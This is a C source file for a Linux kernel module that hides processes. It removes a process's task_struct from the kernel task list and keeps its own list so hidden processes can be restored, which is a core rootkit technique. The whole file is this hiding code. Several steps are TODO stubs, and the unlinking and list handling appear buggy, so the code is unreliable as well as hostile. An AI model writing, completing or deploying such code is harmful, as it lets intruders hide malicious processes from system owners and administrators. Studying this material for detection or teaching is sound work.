#include <linux/slab.h>
#include <linux/pid.h>

#include "hidepid.h"

static pid_list_t hidden_pids = {
    .pid  = -1,
    .task = NULL,
    .prev = NULL,
    .next = NULL,
    .head = NULL,
    .tail = NULL
};

// https://tldp.org/LDP/lki/lki-2.html
void
hide_pid(pid_t pid)
{
    size_t i;
    struct pid *spid;
    struct task_struct *task;

    if (list_contains_pid(&hidden_pids, pid))
        return;

    if (!(spid = find_get_pid(pid)) || !(task = pid_task(spid, PIDTYPE_PID)))
        return;

    { // unlink from circular DLL of task_structs
        task->tasks.prev->next = task->tasks.next;
        task->tasks.next->prev = task->tasks.prev;
    }

    { // TODO: remove pid from `pidhash`
    }

    add_pid_to_list(hidden_pids.tail, pid, task);
}

void
unhide_pid(pid_t pid)
{
    size_t i;
    struct pid *spid;
    pid_list_t_ptr node;

    if (!(node = find_pid_in_list(&hidden_pids, pid)))
        return;

    if (!(spid = get_task_pid(node->task, PIDTYPE_PID)))
        return;

    { // relink within circular DLL of task_structs
        node->task->tasks.next->prev = &node->task->tasks;
        node->task->tasks.prev->next = &node->task->tasks;
    }

    { // TODO: readd pid to `pidhash`
    }

    remove_pid_from_list(hidden_pids.tail, pid);
}

void
clear_hidden_pids(void)
{
    pid_list_t_ptr i = hidden_pids.tail;
    while ((i = remove_pid_from_list(i, i->pid)));
}

void
unhide_pids(void)
{
    clear_hidden_pids();
    // TODO: disable pid hiding
}


void
init_pid_list(void)
{
    hidden_pids.head = &hidden_pids;
    hidden_pids.tail = &hidden_pids;
}

bool
list_contains_pid(pid_list_t_ptr list, pid_t pid)
{
    return !!find_pid_in_list(list, pid);
}

pid_list_t_ptr
find_pid_in_list(pid_list_t_ptr list, pid_t pid)
{
    pid_list_t_ptr i;
    for (i = list; i; i = i->next)
        if (i->pid == pid)
            return i;

    for (i = list->prev; i; i = i->prev)
        if (i->pid == pid)
            return i;

    return NULL;
}

pid_list_t_ptr
add_pid_to_list(pid_list_t_ptr tail, pid_t pid, struct task_struct *task)
{
    pid_list_t_ptr node;
    node = (pid_list_t_ptr)kmalloc(sizeof(pid_list_t), GFP_KERNEL);

    if (node) {
        node->pid = pid;
        node->task = task;
        node->next = NULL;
        node->prev = tail;
        tail->next = node;
        hidden_pids.tail = node;
        return node;
    }

    return NULL;
}

pid_list_t_ptr
remove_pid_from_list(pid_list_t_ptr list, pid_t pid)
{
    pid_list_t_ptr ret = NULL, i = find_pid_in_list(list, pid);

    if (i) {
        if (i->next)
            i->next->prev = i->prev;
        else
            hidden_pids.head = i->prev;

        if (i->prev) {
            i->prev->next = i->next;
            ret = i->prev;
        }

        kfree(i);
    }

    return ret;
}
